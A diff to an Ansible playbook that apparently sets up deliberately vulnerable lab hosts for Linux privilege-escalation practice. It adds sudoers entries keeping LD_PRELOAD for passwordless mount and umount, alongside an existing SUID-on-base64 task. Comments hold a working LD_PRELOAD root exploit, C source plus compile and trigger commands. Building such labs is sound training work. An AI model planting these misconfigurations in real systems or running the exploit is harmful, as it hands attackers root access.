@@ -285,3 +285,45 @@
     - name: set the suid bit for base64
       command: chmod u+s /usr/bin/base64
       # base64 root_password | base64 -d; su
+
+- name: LD_PRELOAD enabled on sudo calls
+  hosts: vuln_ld_preload
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: install gcc
+      apt:
+        name: gcc
+        state: present
+
+    - name: allow LD_PRELOAD in sudo
+      lineinfile:
+        path: /etc/sudoers
+        line: 'Defaults    env_keep += "LD_PRELOAD"'
+        state: present
+        validate: '/usr/sbin/visudo -cf %s'
+
+    - name: allow lowpriv to execute sudo mount
+      lineinfile:
+        path: /etc/sudoers
+        line: 'lowpriv ALL=(ALL) NOPASSWD: /bin/mount /dev/sdb1 /mnt/usb'
+        state: present
+        validate: '/usr/sbin/visudo -cf %s'
+
+    - name: allow lowpriv to execute sudo umount
+      lineinfile:
+        path: /etc/sudoers
+        line: 'lowpriv ALL=(ALL) NOPASSWD: /bin/umount /mnt/usb'
+        state: present
+        validate: '/usr/sbin/visudo -cf %s'
+        # nano exploit.c
+        # #include <unistd.h>
+        # #include <stdlib.h>
+        # void _init() {
+        #   unsetenv("LD_PRELOAD");
+        #   setgid(0);
+        #   setuid(0);
+        #   system("/bin/bash");
+        # }
+        # gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
+        # sudo LD_PRELOAD=$PWD/exploit.so /bin/mount /dev/sdb1 /mnt/usb
